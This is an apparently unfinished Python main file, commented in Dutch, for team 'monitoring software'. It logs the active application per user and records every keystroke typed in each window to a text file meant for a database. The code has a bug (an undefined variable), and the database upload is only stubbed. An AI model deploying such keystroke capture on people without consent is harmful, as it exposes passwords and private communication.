########################################################################################################################
#               Dit is voor nu het main bestand voor de monitoringssoftware.                                           #
#               Probeer zoveel mogelijk code in functies/classes te plaatsen i.p.v. los.                               #
#               Als het nodig lijkt, bespreek met projectleden of er verschillende .py bestanden nodig zijn.           #
#               - Keano (03-04-2023)                                                                                   #
########################################################################################################################

# Hier alle library imports
import web_and_app_info_logger
import keystrokes_and_clipboard_logger
import os
import datetime


# Hieronder de relevante code
def main():
    if os.path.isfile("keyboard_events.txt"):
        # Code voor versturen van het bestand naar DB
        print("Bestand is verstuurd naar de database!")
    with open("keyboard_events.txt", 'w') as f:
        last_active_window = None
        f.write("Gebruiker: Keano S." + "\n")  # Keano vervangen met identificerende gebruiker
        f.write("======================================================" + "\n")
        keylogger = keystrokes_and_clipboard_logger.Keylogger()
        while True:
            active_window, active_window_title = web_and_app_info_logger.active_window_grabber()
            if active_window != last_active_window and not keylogger.is_recording:
                keylogger.start_keylogger_recording()
                f.write(f"OPENED {active_window_title} ON {datetime.datetime.now()} \n")

            elif active_window_title != last_window_title and keylogger.is_recording:
                keylogger.stop_keylogger_recording()
                relevant_keys = keylogger.get_down_keypressed()
                f.write(f"{relevant_keys} \n")
            last_active_window = active_window

    # Begin van programma, maak txt file o.b.v. datum + tijdstip
    # Zolang programma runned, controleer welke applicatie openstaat.
    # Als nieuwe applicatie geopend, schrijf op nieuwe regel "OPENED {applicatienaam} met misschien tijd + datum erbij"
    # Alle gelogde keys onder die regel ==> elk karakter nieuwe regel? Elk woord? 1 lange string?
    # Als applicatie gesloten ==> noteer in tekstbestand met tijdstip? (Nodig?)
    # Als applicatie niet gesloten ==> niks doen.



if __name__ == '__main__':
    main()